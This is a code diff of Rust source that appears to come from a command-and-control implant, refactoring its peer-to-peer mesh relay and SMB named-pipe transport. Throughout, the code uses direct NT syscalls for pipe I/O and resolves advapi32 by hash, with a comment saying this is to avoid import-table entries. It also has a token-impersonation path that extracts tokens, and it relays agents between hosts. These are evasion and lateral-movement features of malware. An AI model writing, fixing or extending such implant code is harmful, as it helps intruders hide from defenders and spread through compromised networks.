@@ -1157,7 +1157,7 @@ pub const REJECT_CAPACITY_FULL: u8 = 0x01;
 const P2P_HKDF_INFO: &[u8] = common::hkdf_info::P2P_LINK;
 
 /// Maximum agent_id length accepted in a LinkRequest.
-const MAX_AGENT_ID_LEN: usize = 256;
+pub(crate) const MAX_AGENT_ID_LEN: usize = 256;
 
 /// Maximum P2P frame size over TCP (4-byte length prefix + frame).
 const TCP_MAX_FRAME_BYTES: usize = 16 * 1024 * 1024;
@@ -1581,6 +1581,7 @@ pub async fn handle_route_probe(
         let frame = P2pFrame {
             frame_type: P2pFrameType::RouteProbeReply,
             link_id,
+            sequence: 0,
             payload_len: encrypted.len() as u32,
             payload: encrypted,
         };
@@ -1841,6 +1842,7 @@ pub async fn handle_bandwidth_probe(
     let frame = P2pFrame {
         frame_type: P2pFrameType::BandwidthProbe,
         link_id,
+        sequence: 0,
         payload_len: encrypted_echo.len() as u32,
         payload: encrypted_echo,
     };
@@ -2027,7 +2029,7 @@ impl P2pMesh {
     /// Returns `true` if more than [`RELAY_THROTTLE_THRESHOLD`] agents are
     /// being relayed and the relay bandwidth budget has been exceeded.
     pub fn should_throttle_relay(&self, additional_bytes: u64) -> bool {
-        use common::p2p_proto::{RELAY_THROTTLE_FRACTION, RELAY_THROTTLE_THRESHOLD};
+        use common::p2p_proto::RELAY_THROTTLE_THRESHOLD;
 
         if self.relay_active_agents.len() <= RELAY_THROTTLE_THRESHOLD {
             return false;
@@ -2066,7 +2068,7 @@ impl P2pMesh {
     /// - `DropTooDeep { destination, origin, hop_count }` — exceeded max hops
     pub fn handle_mesh_data_forward(
         &mut self,
-        incoming_link_id: u32,
+        _incoming_link_id: u32,
         decrypted_payload: &[u8],
     ) -> MeshRelayAction {
         use common::p2p_proto::{MeshRoutingBlob, MAX_MESH_HOP_COUNT};
@@ -2942,15 +2944,16 @@ pub fn spawn_child_relay(
                                         }
                                         #[cfg(all(windows, feature = "smb-pipe-transport"))]
                                         P2pTransport::SmbPipe(ref pipe) => {
-                                            let encrypted = encrypt_payload(&key, &fwd_frame.payload)?;
-                                            let enc_frame = P2pFrame {
-                                                frame_type: P2pFrameType::MeshDataForward,
-                                                link_id: next_link_id,
-                                                sequence: 0,
-                                                payload_len: encrypted.len() as u32,
-                                                payload: encrypted,
-                                            };
-                                            nt_pipe_server::NtPipeHandle::write_frame(pipe, &enc_frame)
+                                            encrypt_payload(&key, &fwd_frame.payload).and_then(|encrypted| {
+                                                let enc_frame = P2pFrame {
+                                                    frame_type: P2pFrameType::MeshDataForward,
+                                                    link_id: next_link_id,
+                                                    sequence: 0,
+                                                    payload_len: encrypted.len() as u32,
+                                                    payload: encrypted,
+                                                };
+                                                nt_pipe_server::NtPipeHandle::write_frame(pipe, &enc_frame)
+                                            })
                                         }
                                         _ => Err(anyhow::anyhow!("unsupported transport")),
                                     };
@@ -3054,6 +3057,7 @@ pub fn spawn_child_relay(
                                     let ack_frame = P2pFrame {
                                         frame_type: P2pFrameType::KeyRotationAck,
                                         link_id,
+                                        sequence: 0,
                                         payload_len: 0,
                                         payload: ack_payload.to_vec(),
                                     };
@@ -3069,17 +3073,18 @@ pub fn spawn_child_relay(
                                         }
                                         #[cfg(all(windows, feature = "smb-pipe-transport"))]
                                         P2pTransport::SmbPipe(ref pipe) => {
-                                            let encrypted =
-                                                encrypt_payload(&key, &ack_frame.payload)?;
-                                            let enc_frame = P2pFrame {
-                                                frame_type: P2pFrameType::KeyRotationAck,
-                                                link_id,
-                                                payload_len: encrypted.len() as u32,
-                                                payload: encrypted,
-                                            };
-                                            nt_pipe_server::NtPipeHandle::write_frame(
-                                                pipe, &enc_frame,
-                                            )
+                                            encrypt_payload(&key, &ack_frame.payload).and_then(|encrypted| {
+                                                let enc_frame = P2pFrame {
+                                                    frame_type: P2pFrameType::KeyRotationAck,
+                                                    link_id,
+                                                    sequence: 0,
+                                                    payload_len: encrypted.len() as u32,
+                                                    payload: encrypted,
+                                                };
+                                                nt_pipe_server::NtPipeHandle::write_frame(
+                                                    pipe, &enc_frame,
+                                                )
+                                            })
                                         }
                                         _ => Err(anyhow::anyhow!("unsupported transport")),
                                     };
@@ -3488,15 +3493,16 @@ pub fn spawn_parent_reader(
                                         }
                                         #[cfg(all(windows, feature = "smb-pipe-transport"))]
                                         P2pTransport::SmbPipe(ref pipe) => {
-                                            let encrypted = encrypt_payload(&key, &fwd_frame.payload)?;
-                                            let enc_frame = P2pFrame {
-                                                frame_type: P2pFrameType::MeshDataForward,
-                                                link_id: next_link_id,
-                                                sequence: 0,
-                                                payload_len: encrypted.len() as u32,
-                                                payload: encrypted,
-                                            };
-                                            nt_pipe_server::NtPipeHandle::write_frame(pipe, &enc_frame)
+                                            encrypt_payload(&key, &fwd_frame.payload).and_then(|encrypted| {
+                                                let enc_frame = P2pFrame {
+                                                    frame_type: P2pFrameType::MeshDataForward,
+                                                    link_id: next_link_id,
+                                                    sequence: 0,
+                                                    payload_len: encrypted.len() as u32,
+                                                    payload: encrypted,
+                                                };
+                                                nt_pipe_server::NtPipeHandle::write_frame(pipe, &enc_frame)
+                                            })
                                         }
                                         _ => Err(anyhow::anyhow!("unsupported transport")),
                                     };
@@ -3602,18 +3608,18 @@ pub fn spawn_parent_reader(
                                         }
                                         #[cfg(all(windows, feature = "smb-pipe-transport"))]
                                         P2pTransport::SmbPipe(ref pipe) => {
-                                            let encrypted =
-                                                encrypt_payload(&key, &ack_frame.payload)?;
-                                            let enc_frame = P2pFrame {
-                                                frame_type: P2pFrameType::KeyRotationAck,
-                                                link_id: parent_link_id,
-                                                sequence: 0,
-                                                payload_len: encrypted.len() as u32,
-                                                payload: encrypted,
-                                            };
-                                            nt_pipe_server::NtPipeHandle::write_frame(
-                                                pipe, &enc_frame,
-                                            )
+                                            encrypt_payload(&key, &ack_frame.payload).and_then(|encrypted| {
+                                                let enc_frame = P2pFrame {
+                                                    frame_type: P2pFrameType::KeyRotationAck,
+                                                    link_id: parent_link_id,
+                                                    sequence: 0,
+                                                    payload_len: encrypted.len() as u32,
+                                                    payload: encrypted,
+                                                };
+                                                nt_pipe_server::NtPipeHandle::write_frame(
+                                                    pipe, &enc_frame,
+                                                )
+                                            })
                                         }
                                         _ => Err(anyhow::anyhow!("unsupported transport")),
                                     };
@@ -4041,7 +4047,7 @@ pub fn spawn_heartbeat_task(
                         // Send LinkFailureReport before removing the link
                         // (only if we still have a parent and this isn't
                         // the parent itself).
-                        if let Some(info) = &dead_info {
+                        if let Some(_info) = &dead_info {
                             if mesh_guard.parent_link_id != Some(*dead_lid) {
                                 // send_link_failure_report is a no-op stub;
                                 // actual reporting goes through the outbound
@@ -4801,6 +4807,7 @@ pub mod tcp_transport {
         let req_frame = P2pFrame {
             frame_type: P2pFrameType::LinkRequest,
             link_id,
+            sequence: 0,
             payload_len: req_payload.len() as u32,
             payload: req_payload,
         };
@@ -4950,6 +4957,7 @@ pub mod tcp_transport {
 pub mod nt_pipe_server {
     use super::*;
     use anyhow::{anyhow, Result};
+    use crate::win_types::IO_STATUS_BLOCK;
     use log::{info, warn};
     use std::sync::Mutex;
     use x25519_dalek::{EphemeralSecret, PublicKey};
@@ -4973,7 +4981,8 @@ pub mod nt_pipe_server {
     const FSCTL_PIPE_LISTEN: u32 = 0x00110010;
 
     // Re-export shared constants from parent scope.
-    pub use super::{REJECT_CAPACITY_FULL, MAX_AGENT_ID_LEN};
+    pub use super::REJECT_CAPACITY_FULL;
+    
 
     // ── NT pipe handle wrapper ───────────────────────────────────────────
 
@@ -5121,7 +5130,7 @@ pub mod nt_pipe_server {
         obj_attrs.ObjectName = &mut name_str;
         obj_attrs.Attributes = OBJ_CASE_INSENSITIVE;
 
-        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
+        let mut iosb: IO_STATUS_BLOCK = std::mem::zeroed();
         let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
         let mut timeout: winapi::shared::ntdef::LARGE_INTEGER = std::mem::zeroed();
 
@@ -5156,7 +5165,7 @@ pub mod nt_pipe_server {
     /// Wait for a client to connect to a named pipe using
     /// `NtFsControlFile` with `FSCTL_PIPE_LISTEN`.
     unsafe fn pipe_listen(handle: *mut std::ffi::c_void) -> Result<()> {
-        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
+        let mut iosb: IO_STATUS_BLOCK = std::mem::zeroed();
         let status = crate::syscall!(
             "NtFsControlFile",
             handle as u64,                              // FileHandle
@@ -5183,7 +5192,7 @@ pub mod nt_pipe_server {
 
     /// Read bytes from a file handle via `NtReadFile` (NT direct syscall).
     unsafe fn read_file(handle: *mut std::ffi::c_void, buf: &mut [u8]) -> Result<usize> {
-        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
+        let mut iosb: IO_STATUS_BLOCK = std::mem::zeroed();
         let status = crate::syscall!(
             "NtReadFile",
             handle as u64,
@@ -5204,12 +5213,12 @@ pub mod nt_pipe_server {
                 status as u32
             ));
         }
-        Ok(iosb.Information as usize)
+        Ok(iosb.information as usize)
     }
 
     /// Write bytes to a file handle via `NtWriteFile` (NT direct syscall).
     unsafe fn write_file(handle: *mut std::ffi::c_void, buf: &[u8]) -> Result<usize> {
-        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
+        let mut iosb: IO_STATUS_BLOCK = std::mem::zeroed();
         let status = crate::syscall!(
             "NtWriteFile",
             handle as u64,
@@ -5230,7 +5239,7 @@ pub mod nt_pipe_server {
                 status as u32
             ));
         }
-        Ok(iosb.Information as usize)
+        Ok(iosb.information as usize)
     }
 
     /// Close a handle via `NtClose` (NT direct syscall).
@@ -5246,11 +5255,13 @@ pub mod nt_pipe_server {
     // ── NT client-side constants ──────────────────────────────────────
 
     /// NTSTATUS: The object name was not found (pipe does not exist).
-    const STATUS_OBJECT_NAME_NOT_FOUND: i32 = 0xC0000034_i32;
+    const STATUS_OBJECT_NAME_NOT_FOUND: i32 = 0xC0000034_u32 as i32;
+    /// NTSTATUS: Generic unsuccessful operation.
+    const STATUS_UNSUCCESSFUL: i32 = 0xC0000001_u32 as i32;
     /// NTSTATUS: All pipe instances are busy.
-    const STATUS_INSTANCE_NOT_AVAILABLE: i32 = 0xC00000AB_i32;
+    const STATUS_INSTANCE_NOT_AVAILABLE: i32 = 0xC00000AB_u32 as i32;
     /// NTSTATUS: Named pipe is busy (no instances available for connection).
-    const STATUS_PIPE_BUSY: i32 = 0xC00000AE_i32;
+    const STATUS_PIPE_BUSY: i32 = 0xC00000AE_u32 as i32;
 
     const FILE_SHARE_READ: u32 = 0x00000001;
     const FILE_SHARE_WRITE: u32 = 0x00000002;
@@ -5291,10 +5302,10 @@ pub mod nt_pipe_server {
         obj_attrs.ObjectName = &mut name_str;
         obj_attrs.Attributes = OBJ_CASE_INSENSITIVE;
 
-        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
+        let mut iosb: IO_STATUS_BLOCK = std::mem::zeroed();
         let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
 
-        let status = crate::syscall!(
+        let status = match crate::syscall!(
             "NtOpenFile",
             &mut handle as *mut _ as u64,                 // FileHandle
             (GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE) as u64, // DesiredAccess
@@ -5302,8 +5313,13 @@ pub mod nt_pipe_server {
             &mut iosb as *mut _ as u64,                   // IoStatusBlock
             (FILE_SHARE_READ | FILE_SHARE_WRITE) as u64,  // ShareAccess
             FILE_SYNCHRONOUS_IO_NONALERT as u64,          // OpenOptions
-        )
-        .map_err(|e| anyhow!("nt_syscall resolution for NtOpenFile: {e}"))?;
+        ) {
+            Ok(status) => status,
+            Err(e) => {
+                warn!("p2p-pipe: nt_syscall resolution for NtOpenFile failed: {e}");
+                return Err(STATUS_UNSUCCESSFUL);
+            }
+        };
 
         if status < 0 {
             return Err(status);
@@ -5413,6 +5429,7 @@ pub mod nt_pipe_server {
         let req_frame = P2pFrame {
             frame_type: P2pFrameType::LinkRequest,
             link_id,
+            sequence: 0,
             payload_len: req_payload.len() as u32,
             payload: req_payload,
         };
@@ -5611,9 +5628,9 @@ pub mod nt_pipe_server {
                 if crate::token_impersonation::is_enabled() {
                     // Resolve advapi32 functions at runtime to avoid IAT entries.
                     let advapi32_w: &[u16] = &['a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
-                    let advapi32 = match pe_resolve::get_module_handle_by_hash(
+                    let advapi32 = match unsafe { pe_resolve::get_module_handle_by_hash(
                         pe_resolve::hash_wstr(&advapi32_w[..advapi32_w.len() - 1]),
-                    ) {
+                    ) } {
                         Some(base) => base,
                         None => {
                             log::debug!("p2p-pipe: advapi32 not found for token extraction");
@@ -5848,10 +5865,10 @@ pub mod nt_pipe_server {
             self,
             tx: tokio::sync::mpsc::Sender<P2pListenerEvent>,
         ) -> tokio::task::JoinHandle<()> {
+            let listener = std::sync::Arc::new(self);
             tokio::spawn(async move {
                 loop {
-                    // Borrow the listener inside spawn_blocking.
-                    let listener = &self;
+                    let listener = listener.clone();
 
                     let event =
                         tokio::task::spawn_blocking(move || listener.accept_one()).await;
